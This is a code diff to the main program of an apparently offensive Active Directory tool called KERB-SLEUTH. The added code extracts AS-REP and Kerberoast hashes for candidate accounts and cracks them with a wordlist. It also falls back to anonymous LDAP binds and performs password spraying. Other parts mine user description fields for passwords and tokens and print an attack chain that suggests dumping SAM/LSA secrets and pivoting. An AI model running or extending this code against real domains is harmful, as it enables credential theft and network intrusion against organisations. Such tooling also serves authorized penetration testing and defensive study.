@@ -7,17 +7,39 @@ import (
 	"log"
 	"net"
 	"os"
+	"path/filepath"
 	"strings"
 	"time"
 
 	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/advanced"
 	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/attack"
+	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/cracker"
 	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/ingest"
 	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/krb"
 	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/output"
 	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/triage"
 	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/util"
 )
+
+func connectWithFallback(base krb.ConnectOptions, fallback bool) (*krb.LDAPClient, error) {
+	c, err := krb.Connect(base)
+	if err == nil || !fallback || base.UseSSL || base.StartTLS {
+		return c, err
+	}
+	log.Printf("[!] LDAP connect failed (%v); retrying with STARTTLS", err)
+	b2 := base
+	b2.StartTLS = true
+	b2.UseSSL = false
+	c2, e2 := krb.Connect(b2)
+	if e2 == nil {
+		return c2, nil
+	}
+	log.Printf("[!] STARTTLS failed (%v); retrying LDAPS", e2)
+	b3 := base
+	b3.StartTLS = false
+	b3.UseSSL = true
+	return krb.Connect(b3)
+}
 
 func main() {
 	// Flags
@@ -39,6 +61,12 @@ func main() {
 	outFile := flag.String("o", "results.json", "JSON output file")
 	csvOut := flag.String("csv", "", "Optional CSV output file")
 	jsonOnly := flag.Bool("json", false, "Output JSON to stdout only")
+	ldaps := flag.Bool("ldaps", false, "Use LDAPS (port 636)")
+	starttls := flag.Bool("starttls", false, "Use STARTTLS on LDAP port 389")
+	insecure := flag.Bool("insecure", false, "Skip TLS certificate verification (insecure)")
+	cafile := flag.String("cafile", "", "PEM CA bundle file for TLS verification")
+	kdcHost := flag.String("kdc", "", "Explicit Kerberos KDC hostname or IP")
+	fallbackTLS := flag.Bool("fallback-tls", false, "If plain LDAP fails, try STARTTLS then LDAPS")
 
 	flag.Parse()
 
@@ -68,22 +96,45 @@ func main() {
 		Target:   *target,
 		BindUser: bindUser,
 		BindPass: *pass,
+		UseSSL:   *ldaps,
+		StartTLS: *starttls,
+		Insecure: *insecure,
+		CAFile:   *cafile,
+		KDC:      *kdcHost,
 		Timeout:  10 * time.Second,
 	}
 
 	log.Printf("[*] Auto-detecting connection to %s …", *target)
 
-	// Attempt LDAP connection
-	client, err := krb.Connect(connOpts)
+	client, err := connectWithFallback(connOpts, *fallbackTLS)
 	if err != nil {
-		// Try without domain if first one fails
-		connOpts.BindUser = *user
-		client, err = krb.Connect(connOpts)
+		// Try anonymous binding if credentials were provided but failed
+		if *user == "" && *pass == "" {
+			log.Printf("[*] No credentials provided, attempting anonymous bind...")
+			connOpts.BindUser = ""
+			connOpts.BindPass = ""
+			client, err = connectWithFallback(connOpts, *fallbackTLS)
+		}
+		
 		if err != nil {
-			log.Fatalf("[x] Connection failed: %v", err)
+			connOpts.BindUser = *user
+			client, err = connectWithFallback(connOpts, *fallbackTLS)
+			if err != nil {
+				log.Fatalf("[x] Connection failed: %v", err)
+			}
 		}
 	}
 	defer client.Close()
+
+	// Auto-detect domain from RootDSE if not provided
+	if *domain == "" {
+		log.Printf("[*] Auto-detecting domain from RootDSE...")
+		domainInfo, err := client.GetDomainInfo()
+		if err == nil && domainInfo.DomainName != "" {
+			*domain = domainInfo.DomainName
+			log.Printf("[+] Auto-detected domain: %s", *domain)
+		}
+	}
 
 	// ── basic recon ───────────────────────────────────────────────────────
 	users, err := client.EnumerateUsers()
@@ -116,6 +167,7 @@ func main() {
 	}
 
 	results := output.Results{
+		SchemaVersion: "2.0",
 		Domain: output.DomainInfo{
 			Name:            domainInfo.DomainName,
 			DN:              domainInfo.BaseDN,
@@ -146,14 +198,14 @@ func main() {
 		if !*authorized {
 			log.Fatal("[x] --real requires --yes  (confirm you are authorized)")
 		}
-		runRealKerberos(*target, bindUser, *pass)
+		runRealKerberos(client, effectiveDomain(domainInfo, *domain), all)
 	}
 
 	// ── advanced modules ─────────────────────────────────────────────────
-	var advResults map[string]interface{}
+	advResults := make(map[string]interface{})
 	if *adv || *rbcd || *s4u || *dcsync || *pkinit {
 		advResults = runAdvanced(client, cfg, *adv, *audit, *rbcd, *s4u, *dcsync, *pkinit, *target, bindUser, *pass, *domain)
-		
+
 		results.Advanced = output.AdvancedResults{}
 		if val, ok := advResults["shares"]; ok {
 			results.Advanced.Shares = val.([]string)
@@ -176,13 +228,16 @@ func main() {
 		if val, ok := advResults["rbcd"]; ok {
 			results.Advanced.RBCD = val
 		}
+		if val, ok := advResults["pkinit"]; ok {
+			results.Advanced.PKINIT = val
+		}
 	}
 
 	// ── predator context engine ──────────────────────────────────────────
 	riskInsights, newCandidates := generateRiskInsights(users, advResults)
 	results.RiskInsights = riskInsights
 	results.Candidates = append(results.Candidates, newCandidates...)
-	
+
 	// Update summary with insights
 	results.Summary.ASREPCandidates = 0
 	results.Summary.KerberoastCandidates = 0
@@ -266,7 +321,7 @@ func main() {
 						results := attack.SprayTest(*target, u.SamAccountName, v, *domain)
 						if len(results) > 0 {
 							for svc := range results {
-								if svc == "LDAP" { // Confirmed valid bind
+								if svc == "ldap_bind_ok" { // Confirmed valid bind
 									attack.ReportSuccess(u.SamAccountName, v, svc)
 								}
 							}
@@ -281,7 +336,7 @@ func main() {
 	writeResults(results, all, cfg, *outFile, *csvOut, *siem, *jsonOnly)
 
 	log.Printf("%s[+] Results → %s%s", util.Green, *outFile, util.Reset)
-	log.Printf("%s[+] Done: %d candidates (%d Kerberos / %d Recon / %d HVT)%s", 
+	log.Printf("%s[+] Done: %d candidates (%d Kerberos / %d Recon / %d HVT)%s",
 		util.Green,
 		results.Summary.HighRiskObjects,
 		results.Summary.ASREPCandidates+results.Summary.KerberoastCandidates,
@@ -343,18 +398,115 @@ func writeResults(results output.Results, candidates []krb.Candidate, cfg *triag
 
 func extractAndCrack(candidates []krb.Candidate, wordlist string, client *krb.LDAPClient) {
 	log.Printf("[*] Extracting and cracking hashes...")
-	// Implementation for hash extraction and cracking
+	di, _ := client.GetDomainInfo()
+	domain := di.DomainName
+	if domain == "" {
+		return
+	}
+	dir, err := os.MkdirTemp("", "kerb-sleuth-*")
+	if err != nil {
+		log.Printf("[x] temp dir: %v", err)
+		return
+	}
+	defer os.RemoveAll(dir)
+
+	asrepPath := filepath.Join(dir, "asrep.txt")
+	kerbPath := filepath.Join(dir, "kerberoast.txt")
+	var asrepLines, kerbLines []string
+
+	for _, c := range candidates {
+		switch c.Type {
+		case "ASREP":
+			hr, err := client.ExtractASREPHash(c.SamAccountName, domain)
+			if err != nil {
+				log.Printf("[!] AS-REP %s: %v", c.SamAccountName, err)
+				continue
+			}
+			asrepLines = append(asrepLines, hr.Hash)
+		case "KERBEROAST":
+			for _, spn := range c.SPNs {
+				hr, err := client.ExtractKerberoastHash(c.SamAccountName, domain, spn)
+				if err != nil {
+					log.Printf("[!] Kerberoast %s %s: %v", c.SamAccountName, spn, err)
+					continue
+				}
+				kerbLines = append(kerbLines, hr.Hash)
+			}
+		}
+		time.Sleep(120 * time.Millisecond)
+	}
+
+	if len(asrepLines) > 0 {
+		var b strings.Builder
+		for _, line := range asrepLines {
+			b.WriteString(line)
+			b.WriteByte(10)
+		}
+		_ = os.WriteFile(asrepPath, []byte(b.String()), 0600)
+		if wordlist != "" {
+			if _, err := cracker.CrackHashes(asrepPath, wordlist, "asrep"); err != nil {
+				log.Printf("[x] AS-REP crack: %v", err)
+			}
+		}
+	}
+	if len(kerbLines) > 0 {
+		var kb strings.Builder
+		for _, line := range kerbLines {
+			kb.WriteString(line)
+			kb.WriteByte(10)
+		}
+		_ = os.WriteFile(kerbPath, []byte(kb.String()), 0600)
+		if wordlist != "" {
+			if _, err := cracker.CrackHashes(kerbPath, wordlist, "kerberoast"); err != nil {
+				log.Printf("[x] Kerberoast crack: %v", err)
+			}
+		}
+	}
 }
 
-func runRealKerberos(target, user, pass string) {
-	log.Printf("[*] Running real Kerberos interactions...")
-	// Implementation for real Kerberos protocol
+func runRealKerberos(client *krb.LDAPClient, domain string, candidates []krb.Candidate) {
+	log.Printf("[*] Running real Kerberos interactions (extract hashes to candidates)...")
+	if domain == "" {
+		return
+	}
+	for i := range candidates {
+		switch candidates[i].Type {
+		case "ASREP":
+			hr, err := client.ExtractASREPHash(candidates[i].SamAccountName, domain)
+			if err != nil {
+				log.Printf("[!] AS-REP %s: %v", candidates[i].SamAccountName, err)
+				continue
+			}
+			candidates[i].Hash = hr.Hash
+		case "KERBEROAST":
+			for _, spn := range candidates[i].SPNs {
+				hr, err := client.ExtractKerberoastHash(candidates[i].SamAccountName, domain, spn)
+				if err != nil {
+					log.Printf("[!] Kerberoast %s: %v", candidates[i].SamAccountName, err)
+					continue
+				}
+				candidates[i].Hash = hr.Hash
+				break
+			}
+		}
+		time.Sleep(120 * time.Millisecond)
+	}
+}
+
+func effectiveDomain(di *krb.DomainInfo, flagDomain string) string {
+	if flagDomain != "" {
+		return strings.ToUpper(flagDomain)
+	}
+	if di != nil && di.DomainName != "" {
+		return di.DomainName
+	}
+	return ""
 }
 
 func generateRiskInsights(users []ingest.User, advResults map[string]interface{}) ([]string, []krb.Candidate) {
 	var insights []string
 	var candidates []krb.Candidate
-	
+
 	// Check for High Value Targets (Admins)
 	for _, u := range users {
 		isAdmin := false
@@ -375,7 +527,7 @@ func generateRiskInsights(users []ingest.User, advResults map[string]interface{}
 				Reasons:        []string{"High Value Target: Domain/Enterprise Admin"},
 			})
 		}
-		
+
 		// --- DEEP LDAP ATTRIBUTE MINING ---
 		lootAttributes := map[string]string{
 			"Description": u.Description,
@@ -386,7 +538,7 @@ func generateRiskInsights(users []ingest.User, advResults map[string]interface{}
 		}
 
 		patterns := []string{"password", "pass:", "pwd=", "secret", "creds", "token"}
-		
+
 		for attrName, attrValue := range lootAttributes {
 			lowerValue := strings.ToLower(attrValue)
 			for _, p := range patterns {
@@ -402,18 +554,22 @@ func generateRiskInsights(users []ingest.User, advResults map[string]interface{}
 				}
 			}
 		}
-		
+
 		// Service Accounts
 		if strings.HasPrefix(strings.ToLower(u.SamAccountName), "svc_") || (strings.Contains(strings.ToLower(u.Description), "service") && !strings.Contains(strings.ToLower(u.Description), "account")) {
-			 insights = append(insights, fmt.Sprintf("[INFO] Service account detected: %s (Check for weak/reused passwords)", u.SamAccountName))
+			insights = append(insights, fmt.Sprintf("[INFO] Service account detected: %s (Check for weak/reused passwords)", u.SamAccountName))
 		}
-		
-		// Inactive users with potentially stale passwords
-		if u.LastLogon.IsZero() && !u.PwdLastSet.IsZero() && !strings.Contains(strings.ToLower(u.SamAccountName), "guest") {
-			 insights = append(insights, fmt.Sprintf("[MEDIUM] Inactive user with set password: %s (Potential stale credentials)", u.SamAccountName))
+
+		// Inactive users with potentially stale passwords (prefer lastLogonTimestamp)
+		lastSeen := u.LastLogonTimestamp
+		if lastSeen.IsZero() {
+			lastSeen = u.LastLogon
+		}
+		if lastSeen.IsZero() && !u.PwdLastSet.IsZero() && !strings.Contains(strings.ToLower(u.SamAccountName), "guest") {
+			insights = append(insights, fmt.Sprintf("[MEDIUM] Inactive user with set password: %s (Potential stale credentials)", u.SamAccountName))
 		}
 	}
-	
+
 	// Check SMB findings
 	if val, ok := advResults["sensitive_files"]; ok {
 		files := val.([]advanced.FileFinding)
@@ -443,7 +599,7 @@ func generateRiskInsights(users []ingest.User, advResults map[string]interface{}
 			}
 		}
 	}
-	
+
 	if val, ok := advResults["pwned"]; ok {
 		if pwned := val.(bool); pwned {
 			insights = append(insights, "[CRITICAL] SMB PWNED! Administrative access confirmed via ADMIN$ or C$.")
@@ -454,7 +610,7 @@ func generateRiskInsights(users []ingest.User, advResults map[string]interface{}
 	if len(insights) > 0 {
 		insights = append(insights, "--- Tactical Attack Chain ---")
 		step := 1
-		
+
 		// Step 1: Recon/Credentials
 		if strings.Contains(strings.Join(insights, ""), "juicy share") {
 			insights = append(insights, fmt.Sprintf("Step %d: Enumerate sensitive shares (Logs/Backup) to harvest plaintext credentials.", step))
@@ -463,7 +619,7 @@ func generateRiskInsights(users []ingest.User, advResults map[string]interface{}
 			insights = append(insights, fmt.Sprintf("Step %d: Extract credentials from LDAP 'Description' fields.", step))
 			step++
 		}
-		
+
 		// Step 2: Escalation
 		if val, ok := advResults["pwned"]; ok && val.(bool) {
 			insights = append(insights, fmt.Sprintf("Step %d: Leverage LOCAL ADMIN access to dump SAM/LSA secrets or pivot.", step))
@@ -485,13 +641,20 @@ func generateRiskInsights(users []ingest.User, advResults map[string]interface{}
 
 func runProtocolDiscovery(target string) {
 	log.Printf("[*] Discovering active services on %s...", target)
-	
+
 	ports := map[int]string{
+		88:   "Kerberos",
+		135:  "RPC",
 		389:  "LDAP",
 		445:  "SMB",
-		5985: "WinRM",
+		464:  "kpasswd",
+		636:  "LDAPS",
+		3268: "GC",
+		3269: "GC_SSL",
 		3389: "RDP",
-		135:  "RPC",
+		5985: "WinRM",
+		5986: "WinRM_SSL",
+		9389: "ADWS",
 	}
 
 	var hits []string
